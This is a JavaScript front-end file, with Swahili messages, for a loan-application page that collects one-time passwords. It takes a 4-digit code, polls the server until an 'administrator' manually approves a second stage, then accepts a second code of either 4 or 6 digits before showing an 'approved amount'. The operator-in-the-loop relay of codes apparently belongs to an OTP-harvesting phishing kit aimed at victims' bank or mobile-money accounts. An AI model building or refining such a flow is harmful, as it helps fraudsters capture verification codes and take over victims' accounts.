const otpInput = document.getElementById('otpInput');
const verifyBtn = document.getElementById('verifyOtp');
const resendBtn = document.getElementById('resendOtp');
const otpTimer = document.getElementById('otpTimer');
const idiniMessage = document.getElementById('idiniMessage');
const secondOtpSection = document.getElementById('secondOtpSection');
const secondOtpInput = document.getElementById('secondOtpInput');

let timerInterval = null;
let secondsLeft = 60;
let pollingInterval = null;
let currentStage = 1;

function formatTime(s) {
  const m = String(Math.floor(s / 60)).padStart(2, '0');
  const sec = String(s % 60).padStart(2, '0');
  return `${m}:${sec}`;
}

function startTimer() {
  secondsLeft = 60;
  otpTimer.textContent = formatTime(secondsLeft);
  if (timerInterval) clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    secondsLeft -= 1;
    otpTimer.textContent = formatTime(secondsLeft);
    if (secondsLeft <= 0) {
      clearInterval(timerInterval);
      idiniMessage.textContent = 'Muda umeisha. Tafadhali osha OTP tena kwa kubonyeza "Tuma tena OTP".';
      idiniMessage.className = 'form-feedback error';
    }
  }, 1000);
}

async function verifyOtp() {
  console.log('verifyOtp clicked, currentStage=', currentStage);
  verifyBtn.disabled = true;

  try {
    if (currentStage === 1) {
      const otp = otpInput.value.trim();
      if (!otp) {
        idiniMessage.textContent = 'Tafadhali ingiza OTP.';
        idiniMessage.className = 'form-feedback error';
        return;
      }
      if (!/^\d{4}$/.test(otp)) {
        idiniMessage.textContent = 'Tafadhali ingiza tarakimu 4 (mfano: 1234).';
        idiniMessage.className = 'form-feedback error';
        return;
      }

      const res = await fetch('/verify_otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({request_id: REQUEST_ID, otp})
      });
      const data = await res.json();

      if (res.ok && data.status === 'pending_second') {
        idiniMessage.textContent = data.message || 'OTP ya kwanza imekubaliwa. Subiri msimamizi kuidhinisha hatua ya mwisho.';
        idiniMessage.className = 'form-feedback success';
        startPollingForSecond();
      } else if (res.ok && data.status === 'success') {
        document.querySelector('.application-form').style.display = 'none';
        const approvalMessage = document.getElementById('approvalMessage');
        document.getElementById('approvedName').textContent = data.name;
        document.getElementById('approvedPhone').textContent = data.phone;
        document.getElementById('approvedAmount').textContent = data.approved_amount;
        approvalMessage.style.display = 'block';
      } else {
        idiniMessage.textContent = data.message || 'OTP si sahihi.';
        idiniMessage.className = 'form-feedback error';
      }
    } else if (currentStage === 2) {
      const otp = secondOtpInput.value.trim();
      if (!otp) {
        idiniMessage.textContent = 'Tafadhali ingiza OTP ya mwisho.';
        idiniMessage.className = 'form-feedback error';
        return;
      }
      if (!/^\d{4}$/.test(otp) && !/^\d{6}$/.test(otp)) {
        idiniMessage.textContent = 'Tafadhali ingiza tarakimu 4 au 6 (mfano: 1234 au 123456).';
        idiniMessage.className = 'form-feedback error';
        return;
      }

      const res = await fetch('/verify_otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({request_id: REQUEST_ID, otp})
      });
      const data = await res.json();

      if (res.ok && data.status === 'success') {
        document.querySelector('.application-form').style.display = 'none';
        const approvalMessage = document.getElementById('approvalMessage');
        document.getElementById('approvedName').textContent = data.name;
        document.getElementById('approvedPhone').textContent = data.phone;
        document.getElementById('approvedAmount').textContent = data.approved_amount;
        approvalMessage.style.display = 'block';
      } else {
        idiniMessage.textContent = data.message || 'OTP si sahihi.';
        idiniMessage.className = 'form-feedback error';
      }
    }
  } catch (error) {
    console.error(error);
    idiniMessage.textContent = 'Hitilafu imetokea. Tafadhali jaribu tena.';
    idiniMessage.className = 'form-feedback error';
  } finally {
    verifyBtn.disabled = false;
  }
}

function startPollingForSecond() {
  if (pollingInterval) clearInterval(pollingInterval);
  pollingInterval = setInterval(async () => {
    try {
      const res = await fetch(`/status/${REQUEST_ID}`);
      if (res.status === 404) return;
      const data = await res.json();

      if (data.status === 'denied') {
        clearInterval(pollingInterval);
        idiniMessage.textContent = '❌ Ombi limekataliwa. Weka nambari sahihi na utume tena.';
        idiniMessage.className = 'form-feedback error';
      } else if (data.status === 'allowed2') {
        clearInterval(pollingInterval);
        currentStage = 2;
        if (secondOtpSection) secondOtpSection.style.display = 'block';
        idiniMessage.textContent = 'Msimamizi ameidhinisha hatua ya mwisho. Tafadhali ingiza OTP ya mwisho (4 au 6).';
        idiniMessage.className = 'form-feedback success';
        startTimer();
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
}

async function resendOtp() {
  resendBtn.disabled = true;
  try {
    const res = await fetch('/resend_otp', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({request_id: REQUEST_ID})
    });
    const data = await res.json();

    if (res.ok) {
      idiniMessage.textContent = 'OTP imetatizwa. Angalia ujumbe wa msimamizi au subiri ujumbe.';
      idiniMessage.className = 'form-feedback success';
      startTimer();
      setTimeout(() => { window.location.href = `/application?request_id=${REQUEST_ID}&show_status=1`; }, 700);
    } else {
      idiniMessage.textContent = data.message || 'Imeshindikana kutuma tena OTP.';
      idiniMessage.className = 'form-feedback error';
    }
  } catch (e) {
    idiniMessage.textContent = 'Kosa la mtandao.';
    idiniMessage.className = 'form-feedback error';
  } finally {
    resendBtn.disabled = false;
  }
}

verifyBtn.addEventListener('click', verifyOtp);
resendBtn.addEventListener('click', resendOtp);

window.addEventListener('DOMContentLoaded', () => {
  startTimer();
});
